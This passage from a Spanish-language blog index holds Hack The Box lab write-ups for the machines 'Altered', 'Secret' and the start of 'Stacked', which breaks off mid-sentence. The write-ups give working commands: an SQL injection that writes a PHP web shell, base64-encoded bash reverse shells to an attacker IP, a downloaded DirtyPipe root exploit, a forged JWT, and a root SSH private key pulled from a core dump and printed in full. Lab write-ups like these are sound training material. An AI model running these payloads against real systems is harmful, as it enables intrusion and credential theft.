$realip $remote_addr; if ($http_x_forwarded_for ~ \"^(\\d+\\.\\d+\\.\\d+\\.\\d+)\") { set $realip $1; } index index.php; charset utf-8; location / { try_files $uri $uri/ /index.php?$query_string; } location = /favicon.ico { access_log off; log_not_found off; } location = /robots.txt { access_log off; log_not_found off; } error_page 404 /index.php; location ~ \\.php$ { fastcgi_pass unix:/run/php/php-fpm.sock; fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name; include fastcgi_params; } location ~ /\\.(?!well-known).* { deny all; } }  El directorio raíz es /srv/altered/public. Tenemos que injectar código PHP:\n$ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"0 union select 1,2,'\u0026lt;?php system(\\\\\\\"whoami\\\\\\\"); ?\u0026gt;' into outfile \\\\\\\"/srv/altered/public/r.php\\\\\\\"-- -\\\",\\\"secret\\\":true}\" -X GET -H 'Content-Type: application/json' \u0026/dev/null $ curl 10.10.11.159/r.php 1 2 www-data  Genial, vamos a por una reverse shell:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ curl 10.10.11.159/api/getprofile -d \"{\\\"id\\\":\\\"0 union select 1,2,'\u0026lt;?php system(\\\\\\\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\\\\\\\"); ?\u0026gt;' into outfile \\\\\\\"/srv/altered/public/rr.php\\\\\\\"-- -\\\",\\\"secret\\\":true}\" -X GET -H 'Content-Type: application/json' \u0026/dev/null $ curl 10.10.11.159/rr.php  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.159. Ncat: Connection from 10.10.11.159:52116. bash: cannot set terminal process group (928): Inappropriate ioctl for device bash: no job control in this shell www-data@altered:/srv/altered/public$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@altered:/srv/altered/public$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@altered:/srv/altered/public$ export TERM=xterm www-data@altered:/srv/altered/public$ export SHELL=bash www-data@altered:/srv/altered/public$ stty rows 50 columns 158  Escalada de privilegios Podemos enumerar la versión del kernel de Linux:\nwww-data@altered:/home/htb$ uname -a Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux  Existe una vulnerabilidad del kernel llamada DirtyPipe (CVE-2022-0847) que afecta a esta versión de kernel. Podemos descargar el exploit en C desde CVE-2022-0847-DirtyPipe-Exploits y compilarlo en local. Luego, subimos el binario a la máquina con un servidor web en Python y lo ejecutamos:\nwww-data@altered:/tmp$ curl 10.10.17.44/exploit-1 -so dp www-data@altered:/tmp$ chmod +x dp www-data@altered:/tmp$ ./dp Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"piped\"... --- Welcome to PAM-Wordle! ---  Espera, ¿qué? ¿Wordle? ¿De verdad? Vale\u0026hellip; vamos a divertirnos:\nwww-data@altered:/tmp$ ./dp Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"piped\"... --- Welcome to PAM-Wordle! --- A five character [a-z] word has been selected. You have 6 attempts to guess the word. After each guess you will recieve a hint which indicates: ? - what letters are wrong. * - what letters are in the wrong spot. [a-z] - what letters are correct. --- Attempt 1 of 6 --- Word: Invalid guess: unknown word. Word: shell Hint-\u0026gt;?h??? --- Attempt 2 of 6 --- Word: hacks Hint-\u0026gt;*?*?? --- Attempt 3 of 6 --- Word: chmod Hint-\u0026gt;ch?*? --- Attempt 4 of 6 --- Word: chown Correct! Password: piped Restoring /etc/passwd from /tmp/passwd.bak... Done! Popping shell... (run commands now) whoami root cat /root/root.txt 0d52a60c9470a4a1ea3a73c808072b4b  ","image":"/images/HTB/Altered/Altered.png","permalink":"https://7rocky.github.io/htb/altered/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web vulnerable a enumeración de usuarios. Luego podemos hacer fuerza bruta para sacar un PIN y cambiar la contraseña, evitando la limitación de peticiones, y explotar SQLi y Type Juggling. Despúes, se ve que el kernel de Linux es vulnerable a DirtyPipe. Para comprometer esta máquina se necesitan conocimientos avanzados de explotación web. En este write-up se utiliza un script en Ruby para encontrar el PIN válido","time":6,"title":"Altered"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.120   Fecha: 30 / 10 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.120 -p 22,80,3000 Nmap scan report for 10.10.11.120 Host is up (0.063s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.70 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 3000 (HTTP).\nEnumeración web En el puerto 80 encontramos la documentación de una API. Exactamente lo mismo en el puerto 3000:\nLeyendo la documentación, vemos que están utilizando Express JS y MongoDB en Node.js. Además, gestionan la autenticación y autorización mediante JSON Web Token (JWT):\nLa API tiene las siguientes rutas: /api/user/register, /api/user/login y /api/priv. Algunos ejemplos de peticiones se muestran en las siguientes imágenes:\nParece claro que el vector de ataque estará relacionado con JWT. Podemos intentar utilizar la contraseña mostrada en la documentación para iniciar sesión como dasith, pero no funciona.\nAnálisis de código estático En la página principal, podemos descargar un archivo ZIP con el código fuente de la API:\nEl archivo ZIP contiene los siguientes archivos:\n$ cd local-web $ tree -I 'node_modules|public' . ├── index.js ├── model │ └── user.js ├── package-lock.json ├── package.json ├── routes │ ├── auth.js │ ├── forgot.js │ ├── private.js │ └── verifytoken.js ├── src │ ├── routes │ │ └── web.js │ └── views │ ├── 404.ejs │ ├── doc.ejs │ └── home.ejs └── validations.js 5 directories, 13 files  Entonces podemos comenzar a analizar el código. Parece que hay otra ruta, pero solamente accesible por el usuario theadmin:\nrouter.get('/logs', verifytoken, (req, res) =\u0026gt; { const file = req.query.file const userinfo = { name: req.user } const name = userinfo.name.name if (name === 'theadmin') { const getLogs = `git log --oneline ${file}` exec(getLogs, (err, output) =\u0026gt; { if (err) { return res.status(500).send(err) } res.json(output) }) } else { res.json({ role: { role: 'you are normal user', desc: userinfo.name.name } }) } })  Aquí vemos que el parámetro file es vulnerable a inyección de comandos, ya que se inserta en un comando de sistema sin ninguna validación. Este será el camino dpara acceder a la máquina, pero se necesita un token JWT válido para el usuario theadmin.\nPor otro lado, existe una validación exhaustiva de las tres rutas mencionadas anteriormente:\n// register validation const registerValidation = data =\u0026gt; { const schema = { name: Joi.string().min(6).required(), email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() } return Joi.validate(data, schema) } // login validation const loginValidation = data =\u0026gt; { const schema2 = { email: Joi.string().min(6).required().email(), password: Joi.string().min(6).required() } return Joi.validate(data, schema2) }  Por este motivo, no se puede realizar ningún tipo de inyección NoSQL, ya que los parámetros están correctamente validados. Y finalmente, la implementación de JWT es correcta.\nEn el proyecto podemos ver un archivo .env con la siguiente imformación:\nDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret  La variable TOKEN_SECRET se utiliza para firmar los tokens JWT. Podemos utilizarlo en la página web, pero no es válido.\nEntonces, podemos intentar hacer un ataque de fuerza bruta al secreto utilizando el archivo rockyou.txt desde Node.js. Curiosamente, si se utiliza el token JWT que se muestra en la documentación de la API, el secreto es example:\n$ node \u0026gt; const fs = require('fs') undefined \u0026gt; const jwt = require('jsonwebtoken') undefined \u0026gt; for (const password of fs.readFileSync('rockyou.txt').toString().split('\\n')) { try { jwt.verify('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg', password); console.log(password); break } catch (err) { } } example undefined  Pero este secreto example no funciona en la página web. Si tratamos de tralizar fuerza bruta a un token JWT generado por la página web al registrar un usuario e iniciar sesión, no conseguimos el secreto (lo cual quiere decir que no está en rockyou.txt).\nEnumeración del proyecto Git En el archivo ZIP, hay también una carpeta .git. Esto se debe a que el proyecto está controlado por un repositorio de Git. Entonces, podemos tratar de ver si hay información sensible en commits anteriores. Por ejemplo, podemos ver el histórico de commits de Git:\n$ git log commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -\u0026gt; master) Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Thu Sep 9 00:03:27 2021 +0530 now we can view logs from server 😃 commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:30:17 2021 +0530 removed .env for security reasons commit de0a46b5107a2f4d26e348303e76d85ae4870934 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:29:19 2021 +0530 added /downloads commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:27:35 2021 +0530 removed swap commit 3a367e735ee76569664bf7754eaaade7c735d702 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:26:39 2021 +0530 added downloads commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8 Author: dasithsv \u0026lt;dasithsv@gmail.com\u0026gt; Date: Fri Sep 3 11:25:52 2021 +0530 first commit  Vemos que el archivo .env fue modificado en el commit que empieza por 67d8da7a. Entonces, podemos ver las diferencias existentes entre el commit anterior (el que empieza por de0a46b5) y la versión actual del proyecto:\n$ git diff -p de0a46b5 | grep TOKEN_SECRET -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret  Y ahora tenemos este secreto tan largo que debe ser el que se utiliza en la API. Entonces, podemos crear un token JWT utilizando este secreto:\n\u0026gt; jwt.sign({ _id: '1337', name: 'theadmin', email: 'root@dasith.works' }, 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE') 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'  Acceso a la máquina En este punto, podemos explotar la vulnerabilidad de inyección de comandos y conseguir una conexión con la máquina. Para ello, podemos utilizar un payload típico de una reverse shell en Bash, pero codificado en Base64 para evitar problemas de caracteres:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  Con esto, explotamos la inyección de comandos añadiendo un punto y coma y después el comando (nótese que + es un espacio en codificación de URL):\n$ curl '10.10.11.120/api/logs?file=;+echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx+|+base64+-d+|+bash' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiIxMzM3IiwibmFtZSI6InRoZWFkbWluIiwiZW1haWwiOiJyb290QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE0MDg0MX0.1VxXuW13J_naXwUAKEPe5O2EMo5GXljVslevhsg4cCQ'  Y obtenemos acceso a la máquina como usuario dasith mediante nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.120. Ncat: Connection from 10.10.11.120:34952. bash: cannot set terminal process group (1118): Inappropriate ioctl for device bash: no job control in this shell dasith@secret:~/local-web$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null dasith@secret:~/local-web$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm dasith@secret:~/local-web$ export SHELL=bash dasith@secret:~/local-web$ export TERM=xterm dasith@secret:~/local-web$ stty rows 50 columns 158  En este punto, ya podemos capturar la flag user.txt:\ndasith@secret:~/local-web$ cd dasith@secret:~$ cat user.txt 257020bf6c2e57197510fcb6b5f4726c  Encontrando un binario SUID Después de enumerar el sistema, encontramos un binario SUID en /opt/count:\ndasith@secret:~$ find / -perm -4000 2\u0026gt;/dev/null | grep -v snap /usr/bin/pkexec /usr/bin/sudo /usr/bin/fusermount /usr/bin/umount /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /opt/count  Se trata de un binario ELF:\ndasith@secret:~$ file /opt/count /opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped  Si se ejecuta el binario, este nos permite leer archivo como usuario root, pero no nos muestra el contenido del archivo leído, sino estadísticas del propio archivo (número de líneas, palabras y letras). También podemos listar el contenido de directorios como usuario root. Después, se puede escribir el resultado en un archivo, pero como usuario dasith (se degradan privilegios en este punto).\nAfortunadamente, tenemos el código fuente del programa en /opt/code.c:\ndasith@secret:~$ ls /opt code.c count valgrind.log  No parece vulnerable a Buffer Overflow, Format String o Library Hijacking. Pero sí hay algo extraño en estas líneas:\n// drop privs to limit file write setuid(getuid()); // Enable coredump generation prctl(PR_SET_DUMPABLE, 1);  Este fragmento de código se ejecuta justo antes de escribir los resultados a un archivo. Esto es un fallo de configuración, ya que si se rompe el proceso, será posible leer los contenidos del coredump como usuario dasith (que contendrá el archivo leído previamente como root).\nEscalada de privilegios Utilizando el binario, podemos ver que root tiene una clave privada id_rsa para SSH:\ndasith@secret:~$ /opt/count Enter source file/directory name: /root -rw-r--r-- .viminfo drwxr-xr-x .. -rw-r--r-- .bashrc drwxr-xr-x .local drwxr-xr-x snap lrwxrwxrwx .bash_history drwx------ .config drwxr-xr-x .pm2 -rw-r--r-- .profile drwxr-xr-x .vim drwx------ . drwx------ .cache -r-------- root.txt drwxr-xr-x .npm drwx------ .ssh Total entries = 15 Regular files = 4 Directories = 10 Symbolic links = 1 Save results a file? [y/N]: dasith@secret:~$ /opt/count Enter source file/directory name: /root/.ssh drwx------ .. -rw------- authorized_keys -rw------- id_rsa drwx------ . -rw-r--r-- id_rsa.pub Total entries = 5 Regular files = 3 Directories = 2 Symbolic links = 0 Save results a file? [y/N]:  Entonces podemos leer este archivo y romper el proceso del programa. Para ello, podemos ponerlo en segundo plano con Control-Z (^Z) y después utilizar kill -SIGSEGV indicando el identificador de proceso (PID) listado con ps -a. Después, traemos el programa al primer plano y vemos el mensaje \u0026ldquo;Segmentation fault (core dumped)\u0026rdquo;:\ndasith@secret:~$ /opt/count Enter source file/directory name: /root/.ssh/id_rsa Total characters = 2602 Total words = 45 Total lines = 39 Save results a file? [y/N]: y Path: ^Z [1]+ Stopped /opt/count dasith@secret:~$ ps -a | grep count 47330 pts/6 00:00:00 count dasith@secret:~$ kill -SIGSEGV 47330 dasith@secret:~$ fg /opt/count Segmentation fault (core dumped)  Este error genera un archivo en /var/crash. Utilizando apport-unpack podemos extraer el archivo CoreDump y leer el contenido de /root/.ssh/id_rsa (porque fue el archivo que leímos con /opt/count):\ndasith@secret:~$ ls /var/crash _opt_count.1000.crash dasith@secret:~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/.crash dasith@secret:~$ ls /tmp/.crash Architecture Date ExecutablePath ProblemType ProcCwd ProcMaps Signal UserGroups CoreDump DistroRelease ExecutableTimestamp ProcCmdline ProcEnviron ProcStatus Uname dasith@secret:~$ strings -n 32 /tmp/.crash/CoreDump /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/libc-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so /usr/lib/x86_64-linux-gnu/ld-2.31.so Please check if file exists and you have read privilege. Enter source file/directory name: Path: esults a file? [y/N]: l words = 45 -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- DB_CONNECT=mongodb://127.0.0.1:27017/auth-web unique_id=4594a417-fb89-4a4a-8936-6a56a15fce32 LESSCLOSE=/usr/bin/lesspipe %s %s TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE pm_pid_path=/home/dasith/.pm2/pids/index-0.pid pm_err_log_path=/home/dasith/.pm2/logs/index-error.log pm_exec_path=/home/dasith/local-web/index.js pm_out_log_path=/home/dasith/.pm2/logs/index-out.log GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0  Finalmente, podemos poner la clave en un archivo y conectarnos a la máquina como root. Y entonces, tenemos la flag root.txt:\n$ chmod 600 id_rsa $ ssh -i id_rsa root@10.10.11.120 root@secret:~# cat /root/root.txt 90fd01f9faa29c802ad279f48224edc8  ","image":"/images/HTB/Secret/Secret.png","permalink":"https://7rocky.github.io/htb/secret/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina contiene una API que utiliza tokens JWT para la autenticación. Podemos descargar el proyecto y ver que es un repositorio de Git, y de las confirmaciones antiguas podemos extraer una clave secreta. Existe un binario SUID que lee archivos como root aunque solo muestra estadísticas del archivo, pero podemos matar el proceso y leer el coredump. Para comprometer esta máquina se necesitan conocimientos de pentesting web, enumeración de Git y procesos en Linux","time":7,"title":"Secret"},{"contents":"  SO: Linux   Dificultad: Insana   Dirección IP: 10.10.11.112   Fecha: 18 / 09 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.112 -p 22,80,2376 Nmap scan report for 10.10.11.112 Host is up (0.051s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA) | 256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA) |_ 256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: STACKED.HTB 2376/tcp open ssl/docker? | ssl-cert: Subject: commonName=0.0.0.0 | Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1 | Not valid before: 2021-07-17T15:37:02 |_Not valid after: 2022-07-17T15:37:02 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 19.38 seconds  La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 2376 (Docker).\nEnumeración web Existe un dominio llamado stacked.htb como se muestra en la salida de nmap, por lo que podemos ponerlo en /etc/hosts. Además, http://10.10.11.112 redirige a http://stacked.htb. Si vamos a esta dirección, veremos una página web como esta:\nNo hay nada que ver aquí. Podemos aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://stacked.htb/FUZZ images [Status: 301, Size: 311, Words: 20, Lines: 10] css [Status: 301, Size: 308, Words: 20, Lines: 10] js [Status: 301, Size: 307, Words: 20, Lines: 10] fonts [Status: 301, Size: 310, Words: 20, Lines: 10] [Status: 200, Size: 5055, Words: 367, Lines: 159] sass [Status: 301, Size: 309, Words: 20, Lines: 10] server-status [Status: 403, Size: 276, Words: 20, Lines: 10]  Pero nada interesante.\nSi tratamos de conectarnos al puerto 2376 con curl descubrimos que se necesitan certificados de cliente:\n$ curl -k https://10.10.11.112:2376 curl: (56) OpenSSL SSL_read: error:14094412:SSL routines:ssl3_read_bytes:sslv3 alert bad certificate, errno 0  Tras in proceso de investigación, vemos que el puerto 2376 es utilizado por Docker cuando se configura para ser usado de forma remota desde otras máquinas. Este es el motivo por el que necesita certificados de cliente, como método de autenticación.\nDe momento, vamos a continuar enumerando subdominios:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.112 -H 'Host: FUZZ.stacked.htb' -fc 302 portfolio [Status: 200, Size: 30268, Words: 11467, Lines: 445]  Una vez configurado el subdominio en /etc/hosts, podemos ir a http://portfolio.stacked.htb y ver la siguiente página web:\nAquí podemos descargar un archivo llamado docker-compose.yml que arranca un entorno de LocalStack para simular AWS en local:\nversion: \"3.3\" services: localstack: container_name: \"${LOCALSTACK_DOCKER_NAME-localstack_main}\" image: localstack/localstack-full:0.12.6 network_mode: bridge ports: - \"127.0.0.1:443:443\" - \"127.0.0.1:4566:4566\" - \"127.0.0.1:4571:4571\" - \"127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}\" environment: - SERVICES=serverless - DEBUG=1 - DATA_DIR=/var/localstack/data - PORT_WEB_UI=${PORT_WEB_UI- } - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- } - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- } - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- } - DOCKER_HOST=unix:///var/run/docker.sock - HOST_TMP_FOLDER=\"/tmp/localstack\" volumes: - \"/tmp/localstack:/tmp/localstack\" - \"/var/run/docker.sock:/var/run/docker.sock\"  Este archivo configura un contenedor que expone puertos 443, 4566, 4571 y 8080 para interactuar con LocalStack. Podemos arrancarlo usando docker-compose up:\n$ docker-compose up [+] Running 1/0 ⠿ Container localstack_main Created 0.0s Attaching to localstack_main localstack_main | Waiting for all LocalStack services to be ready ... localstack_main | Ready. localstack_main | INFO:localstack.utils.analytics.profiler: Execution of \"start_api_services\" took 27272.037982940674ms  Y tenemos ya todos los servicios preparados:\n$ curl localhost:4566 {\"status\": \"running\"}  Comprometiendo LocalStack. Proxy MITM Es posible instalar un proxy MITM y controlar tanto peticiones como respuestas de LocalStack. Esto se explica en SonarSource y PortSwigger. Aunque el ataque está bien explicado, no hay ningún exploit disponible, por lo que tenemos que escribirlo a mano.\nEl primer paso es un Cross-Site Request Forgery (CSRF). El objetivo es que la víctuma acceda a nuestra página web maliciosa y que esta web realice una petición a http://127.0.0.1:4566 para hablar con LocalStack y configurar algunas variables.\nLocalStack permite Cross-Origin Resource Sharing (CORS) a cualquier origen, por lo que Same-Origin Policy no nos bloqueará y podremos leer las respuestas de LocalStack.\nVamos a comenzar creando un simple archivo index.html que llame a al script 